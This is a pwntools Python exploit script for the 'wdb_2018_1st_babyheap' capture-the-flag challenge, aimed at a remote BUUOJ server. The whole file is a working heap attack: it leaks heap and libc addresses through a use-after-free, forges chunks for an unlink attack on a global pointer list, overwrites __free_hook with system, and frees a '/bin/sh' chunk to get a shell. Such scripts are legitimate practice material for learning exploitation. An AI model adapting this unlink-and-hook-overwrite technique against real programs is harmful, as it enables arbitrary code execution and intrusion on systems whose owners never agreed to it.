from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('wdb_2018_1st_babyheap')
io = remote('node4.buuoj.cn', 27714)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('libc-2.23.so')
elf = ELF('wdb_2018_1st_babyheap')
ptr_list = 0x602060

def add(index, content):
    io.sendlineafter('Choice:', '1')
    io.sendlineafter('Index:', str(index))
    io.sendlineafter('Content:', content)


def edit(index, content):
    io.sendlineafter('Choice:', '2')
    io.sendlineafter('Index:', str(index))
    io.sendlineafter('Content:', content)


def show(index):
    io.sendlineafter('Choice:', '3')
    io.sendlineafter('Index:', str(index))
    return io.recvline()[:-1]


def delete(index):
    io.sendlineafter('Choice:', '4')
    io.sendlineafter('Index:', str(index))


def unlink():
    global heap_base, libc_base
    add(0, 'chunk0')
    add(1, 'chunk1' + '\x00' * 0x12 + '\x31')
    add(2, 'chunk2')
    add(3, 'chunk3\x00\x00' + '\x31')
    add(4, '/bin/sh\x00chunk4')
    delete(1)
    delete(0)
    heap_base = u64(show(0).ljust(8, b'\x00')) - 0x30
    log.success('heap_base: ' + hex(heap_base))
    edit(0, p64(heap_base + 0x10) + p64(0x31))
    add(5, 'chunk0')
    add(6, b'\x00' * 0x10 + p64(0x20) + p64(0x90)[:7])
    delete(0)
    prec_size, size, fd, bk = 0, 0x21, ptr_list - 0x18, ptr_list - 0x10
    add(7, p64(prec_size) + p64(size) + p64(fd) + p64(bk)[:7])
    delete(1)
    libc_base = u64(show(6).ljust(8, b'\x00')) - libc.sym['__malloc_hook'] - 0x68
    log.success('libc_base: ' + hex(libc_base))


def pwn():
    __free_hook = libc_base + libc.sym['__free_hook']
    system = libc_base + libc.sym['system']
    edit(0, b'\x00' * 0x18 + p64(__free_hook)[:7])
    edit(0, p64(system))
    delete(4)
    io.interactive()
    # gdb.attach(io)
    # pause()


if __name__ == '__main__':
    unlink()
    pwn()
